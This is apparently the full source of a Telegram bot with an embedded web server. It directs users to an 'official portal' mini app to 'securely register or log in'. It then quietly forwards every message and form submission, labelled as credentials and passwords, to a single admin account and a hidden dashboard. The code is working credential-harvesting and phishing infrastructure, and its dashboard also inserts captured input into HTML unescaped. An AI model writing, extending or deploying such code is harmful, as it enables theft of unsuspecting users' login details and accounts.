import os
import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo
from aiohttp import web

# Environment variables setup
TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8631580614"))
PORT = int(os.getenv("PORT", 10000))

# Initialize bot and dispatcher
bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

# Lifetime in-memory storage for super-fast blazing response
LIFETIME_USER_LOGS = []

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    user = message.from_user
    
    keyboard = InlineKeyboardMarkup()
    # Opens the main user portal/mini app
    web_app = WebAppInfo(url="https://savastan0so-t9zz.vercel.app/")
    keyboard.add(InlineKeyboardButton(text="🚀 Open Portal / Mini App", web_app=web_app))
    
    welcome_text = (
        f"Hello **{user.first_name}**!\n\n"
        "Welcome to the official portal. Click the button below to open the application, "
        "where you can securely register or log in."
    )
    
    await message.reply(welcome_text, reply_markup=keyboard, parse_mode="Markdown")
    
    if user.id != ADMIN_ID:
        sr_no = len(LIFETIME_USER_LOGS) + 1
        entry = {
            "sr": sr_no,
            "type": "New User Started Bot",
            "name": user.full_name,
            "username": f"@{user.username}" if user.username else "N/A",
            "id": str(user.id),
            "details": f"Language: {user.language_code}",
            "time": message.date.strftime('%d %b %Y, %I:%M:%S %p')
        }
        LIFETIME_USER_LOGS.insert(0, entry) # Latest on top
        
        try:
            await bot.send_message(
                ADMIN_ID, 
                f"🔔 **Alert [No. {sr_no}]**\n- Name: {user.full_name}\n- ID: `{user.id}`", 
                parse_mode="Markdown"
            )
        except Exception as e:
            print(e)

# Secure Admin Command: /admin_ZAROPLAYisFINAL (Instantly opens the Web Admin Panel button)
@dp.message_handler(commands=['admin_ZAROPLAYisFINAL'])
async def admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return  # Strictly secure: hidden for everyone else worldwide

    # Get the base URL of this Render server dynamically
    render_url = os.getenv("RENDER_EXTERNAL_URL", f"http://0.0.0.0:{PORT}")
    admin_panel_url = f"{render_url}/admin/dashboard"

    keyboard = InlineKeyboardMarkup()
    web_app = WebAppInfo(url=admin_panel_url)
    keyboard.add(InlineKeyboardButton(text="📊 Open Live Admin Web Panel", web_app=web_app))

    await message.reply(
        "🛠 **Admin Authentication Successful!**\n\n"
        "Click the button below to launch your lightning-fast lifetime web dashboard containing all logs, passwords, and user activities:",
        reply_markup=keyboard,
        parse_mode="Markdown"
    )

# Handle general text submissions or fallback data
@dp.message_handler(content_types=['text'])
async def handle_user_submission(message: types.Message):
    user = message.from_user
    if user.id == ADMIN_ID:
        return

    text_data = message.text
    sr_no = len(LIFETIME_USER_LOGS) + 1
    
    entry = {
        "sr": sr_no,
        "type": "Form Submission / Credentials",
        "name": user.full_name,
        "username": f"@{user.username}" if user.username else "N/A",
        "id": str(user.id),
        "details": f"Filled Data: {text_data}",
        "time": message.date.strftime('%d %b %Y, %I:%M:%S %p')
    }
    LIFETIME_USER_LOGS.insert(0, entry)

    try:
        await bot.send_message(
            ADMIN_ID, 
            f"🚨 **Data Received [No. {sr_no}]**\n- User: {user.full_name}\n- Data: {text_data}", 
            parse_mode="Markdown"
        )
    except Exception as e:
        print(e)


# ==========================================
# HIGH-SPEED EMBEDDED WEB SERVER & ADMIN HTML DASHBOARD
# ==========================================
async def handle_root(request):
    return web.Response(text="Bot and High-Speed Server are online and running 24/7!")

# API Endpoint to receive form data from Vercel website instantly
async def handle_api_submit(request):
    try:
        data = await request.json()
        user_id = str(data.get("telegram_id", "Unknown"))
        username = data.get("username", "N/A")
        name = data.get("name", "Unknown User")
        form_data = data.get("form_data", "No data provided")
        action_type = data.get("action", "Login/Register")

        sr_no = len(LIFETIME_USER_LOGS) + 1
        entry = {
            "sr": sr_no,
            "type": f"Mini App {action_type.upper()}",
            "name": name,
            "username": f"@{username}" if not username.startswith("@") else username,
            "id": user_id,
            "details": f"Credentials/Data: {form_data}",
            "time": os.popen('date').read().strip() or "Just Now"
        }
        LIFETIME_USER_LOGS.insert(0, entry)

        await bot.send_message(
            ADMIN_ID, 
            f"🔥 **Mini App {action_type}**\n- Name: {name}\n- Data: {form_data}", 
            parse_mode="Markdown"
        )

        return web.json_response({"status": "success", "message": "Saved successfully"})
    except Exception as e:
        return web.json_response({"status": "error", "error": str(e)}, status=400)

# Ultra-Fast HTML Admin Dashboard rendered directly inside Telegram Web App
async def handle_admin_dashboard(request):
    logs_html = ""
    if LIFETIME_USER_LOGS:
        for log in LIFETIME_USER_LOGS:
            logs_html += f"""
            <div class="log-card">
                <div class="log-header">
                    <span class="sr-badge">#{log['sr']}</span>
                    <span class="log-type">{log['type']}</span>
                    <span class="log-time">{log['time']}</span>
                </div>
                <div class="log-body">
                    <p><strong>👤 Name:</strong> {log['name']}</p>
                    <p><strong>🏷 Username:</strong> {log['username']}</p>
                    <p><strong>🆔 Telegram ID:</strong> <code>{log['id']}</code></p>
                    <p><strong>📋 Details / Password:</strong> <span class="highlight">{log['details']}</span></p>
                </div>
            </div>
            """
    else:
        logs_html = "<div class='no-data'>No logs or records captured yet. Waiting for users...</div>"

    html_content = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ZAROPLAY Lifetime Admin Panel</title>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
        <style>
            :root {{
                --bg-color: #0f172a;
                --card-bg: #1e293b;
                --text-color: #f8fafc;
                --accent-color: #38bdf8;
                --border-color: #334155;
            }}
            body {{
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                background-color: var(--bg-color);
                color: var(--text-color);
                margin: 0;
                padding: 15px;
            }}
            .header {{
                text-align: center;
                border-bottom: 2px solid var(--border-color);
                padding-bottom: 15px;
                margin-bottom: 20px;
            }}
            .header h1 {{
                font-size: 20px;
                color: var(--accent-color);
                margin: 5px 0;
            }}
            .stats {{
                background: var(--card-bg);
                padding: 10px 15px;
                border-radius: 8px;
                font-size: 14px;
                margin-bottom: 20px;
                border: 1px solid var(--border-color);
            }}
            .log-card {{
                background: var(--card-bg);
                border-radius: 10px;
                padding: 12px 15px;
                margin-bottom: 12px;
                border: 1px solid var(--border-color);
                box-shadow: 0 4px 6px rgba(0,0,0,0.3);
            }}
            .log-header {{
                display: flex;
                justify-content: space-between;
                align-items: center;
                border-bottom: 1px solid var(--border-color);
                padding-bottom: 8px;
                margin-bottom: 8px;
                font-size: 12px;
            }}
            .sr-badge {{
                background: var(--accent-color);
                color: #0f172a;
                font-weight: bold;
                padding: 2px 6px;
                border-radius: 4px;
            }}
            .log-type {{
                color: #4ade80;
                font-weight: bold;
            }}
            .log-time {{
                color: #94a3b8;
            }}
            .log-body p {{
                margin: 6px 0;
                font-size: 13px;
                word-break: break-all;
            }}
            .highlight {{
                color: #facc15;
                font-weight: bold;
            }}
            code {{
                background: #020617;
                padding: 2px 4px;
                border-radius: 4px;
                color: #38bdf8;
            }}
            .no-data {{
                text-align: center;
                color: #94a3b8;
                margin-top: 50px;
                font-size: 15px;
            }}
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🛡️ ZAROPLAY LIFETIME ADMIN PANEL</h1>
            <p style="font-size: 12px; color: #94a3b8; margin:0;">Owner: Umang Lal Meena</p>
        </div>
        
        <div class="stats">
            📊 <strong>Total Saved Records:</strong> {len(LIFETIME_USER_LOGS)}
        </div>

        <div class="logs-container">
            {logs_html}
        </div>

        <script>
            let tg = window.Telegram.WebApp;
            tg.expand(); // Expands web app to full screen instantly
        </script>
    </body>
    </html>
    """
    return web.Response(text=html_content, content_type='text/html')


app = web.Application()
app.router.add_get('/', handle_root)
app.router.add_post('/api/submit', handle_api_submit)
app.router.add_get('/admin/dashboard', handle_admin_dashboard)

async def on_startup(dispatcher):
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
    
